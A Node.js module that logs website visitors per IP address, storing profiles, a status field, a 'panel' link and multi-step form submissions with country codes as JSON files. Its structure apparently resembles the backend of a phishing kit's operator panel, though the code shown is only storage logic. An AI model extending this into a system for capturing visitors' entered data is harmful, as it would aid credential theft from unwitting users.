import { mkdir, readFile, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  buildPanelUrl,
  formatClientId,
  formatTimestamp,
  getClientIp,
  getCountryCode,
  getVisitorProfile
} from "./utils.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const dataDir = path.resolve(__dirname, "..", "data");
const logsDir = path.join(dataDir, "logs");
const submissionsDir = path.join(dataDir, "submissions");

async function ensureDirectories() {
  await mkdir(logsDir, { recursive: true });
  await mkdir(submissionsDir, { recursive: true });
}

async function readJson(filePath, fallback) {
  if (!existsSync(filePath)) {
    return fallback;
  }

  try {
    const content = await readFile(filePath, "utf8");
    return JSON.parse(content);
  } catch {
    return fallback;
  }
}

async function writeJson(filePath, data) {
  await writeFile(filePath, `${JSON.stringify(data, null, 2)}\n`, "utf8");
}

export function getLogFilePath(ip) {
  return path.join(logsDir, `${formatClientId(ip)}.json`);
}

function getSubmissionFilePath(ip) {
  return path.join(submissionsDir, `${formatClientId(ip)}.json`);
}

export async function ensureVisitorSession(request, url) {
  await ensureDirectories();
  const ip = getClientIp(request);
  const filePath = getLogFilePath(ip);
  const existing = await readJson(filePath, null);

  if (existing) {
    if (!existing.panelUrl) {
      existing.panelUrl = buildPanelUrl(url, request, ip);
      await writeJson(filePath, existing);
    }
    return { ip, log: existing };
  }

  const profile = getVisitorProfile(request);
  const log = {
    ...profile,
    timestamp: formatTimestamp(),
    status: "",
    panelUrl: buildPanelUrl(url, request, ip)
  };

  await writeJson(filePath, log);
  return { ip, log };
}

export async function readVisitorLog(ip) {
  await ensureDirectories();
  return readJson(getLogFilePath(ip), null);
}

export async function updateVisitorStatus(ip, status) {
  const log = (await readVisitorLog(ip)) || {
    status: ""
  };

  log.status = status;
  await writeJson(getLogFilePath(ip), log);
  return log;
}

export async function appendSubmission(request, ip, step, payload) {
  await ensureDirectories();
  const filePath = getSubmissionFilePath(ip);
  const existing = await readJson(filePath, []);
  const profile = getVisitorProfile(request);
  const countryCode = getCountryCode(request);
  existing.push({
    step,
    payload,
    countryCode,
    ...profile,
    timestamp: formatTimestamp()
  });
  await writeJson(filePath, existing);
  return existing;
}

export async function readSubmissions(ip) {
  await ensureDirectories();
  return readJson(getSubmissionFilePath(ip), []);
}
